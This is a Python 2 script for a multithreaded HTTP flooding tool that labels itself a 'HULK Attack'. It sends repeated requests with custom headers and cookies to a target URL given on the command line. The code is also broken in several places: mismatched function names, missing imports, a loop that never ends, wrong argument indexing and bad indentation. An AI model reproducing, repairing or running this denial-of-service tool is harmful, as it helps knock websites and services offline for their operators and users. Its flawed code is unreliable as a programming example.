import urllib2
import sys
import threading
import random
import re
import logging

url = ''
param = ''
header = {}
cookies = ''
local = threading.local()
request_counter = 1
thread_counter = 1
run_counter = 1
lock = threading.Lock()
logger = logging.getLogger('mylogger')


def inc_counter():
    global run_counter
    run_counter+=1

def httpcall():
    code = 0
    try:
      cookieHandle = urllib2.HTTPCookieProcessor()
      opener = urllib2.build_opener(cookieHandle)
      opener = addheaders(header,opener)
      opener = addCookie(cookies,opener)
      urllib2.install_opener(opener)
      if len(param)>0:
          request = urllib2.Request(url,param)
      else:
          request = urllib2.Request(url)
          response = urllib2.urlopen(request)
          body = opener.read()
          logging.info(body)
    except urllib2.HTTPError, e:
      local.fail+=1
      print 'Response Code 500'
      code=500
    except urllib2.URLError, e:
      print e.reason
      sys.exit()
    else:
      local.success+=1
      local.data.append(body)
    return(code)

def addHeader(header,opener):
    if len(header)>0:
          for (key,value) in header.items():
            opener.addheaders.append(key,value)
    return opener

def addCookie(cookies,opener):
    if(len(cookies)>0):
      opener.addheaders.append("Cookie",cookies)
    return opener

# def data(url,param,header,cookies):
def data():
    global url 
    global param
    global header
    global cookies
    global thread_counter
    global request_counter
    if len(sys.argv) < 3:
      sys.exit()
    else:
      url = sys.argv[2]
      if len(sys.argv)== 3:
          thread_counter = sys.argv[3]
      if len(sys.argv)==4:
          request_counter = sys.argv[4]
      if len(sys.argv)==5:
          param = sys.argv[5]
      if len(sys.argv)==6:
          header = sys.argv[6]
      if len(sys.argv)==7:
          cookies = sys.argv[7]
def set_url(purl):
    global url
    m = re.search('http\://([^/]*)/?.*', purl)
    if m:
       url = purl
def set_param(type,pparam):
    global param
    if type == 'raw':
       param = json.dumps(pparam)
    elif type == 'x-www-form-urlencode':
       param = urllib.urlencode(pparam)
def set_header(pheader):
    global header
    header = pheader
def set_cookies(pcookies):
    global cookies
    cookies = pcookies
def set_thread_counter(pthread_count):
    global thread_counter
    thread_counter = pthread_count



class MonitorThread(threading.Thread):
    def run(self):
      previous = request_counter
      total_counter = request_counter * thread_counter
      while True :
        # print("request_counter:%d total_counter:%d"%(request_counter,total_counter))
        if (previous+100<request_counter) and (previous!=request_counter):
           print("%d Requests Sent"%request_counter)
           previous=request_counter
        #批量把global中的data进行转移，并且进行log
        if run_counter == total_counter:
           print "\n-- HULK Attack Finished --"
           print("success:%s"%success)
           print("fail:%s"%fail)
           break


class HTTPThread(threading.Thread):
    def run(self):
      count = 0
      success = 0 
      fail = 0
      try:
        # print("flag:%d count:%d thread_counter:%d"%(flag,count,request_counter))
        while count<request_counter:
            code = httpcall()
        if lock.acquire():
           #线程结束，统计成功失败
           success = success + local.success
           fail = fail + local.fail
           print("success:%d fail%d"%(success,fail))
           lock.release()
      except Exception, e:
        raise

def main():
  log()
  data()
  global thread_counter
  for i in range(thread_counter):
      t = HTTPThread()
      t.start()
  # t = MonitorThread()
  # t.start()

def log():
   global logger
    logger.setLevel(logging.DEBUG)
    fh = logging.FileHandler('test.log')
    fh.setLevel(logging.DEBUG)
    logger.addHandler(fh)

if __name__ == '__main__':
  main()



